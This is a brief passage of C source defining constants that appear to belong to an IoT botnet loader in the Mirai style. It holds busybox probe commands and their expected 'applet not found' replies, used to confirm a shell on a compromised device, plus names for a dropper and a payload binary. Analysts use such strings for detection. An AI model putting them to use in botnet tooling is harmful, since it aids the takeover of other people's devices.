...
#define TOKEN_QUERY     "/bin/busybox kura"
#define TOKEN_RESPONSE  "kura: applet not found"

#define EXEC_QUERY     "/bin/busybox aruk"
#define EXEC_RESPONSE  "aruk: applet not found"

#define FN_DROPPER  "namamakk"
#define FN_BINARY   "kurc"
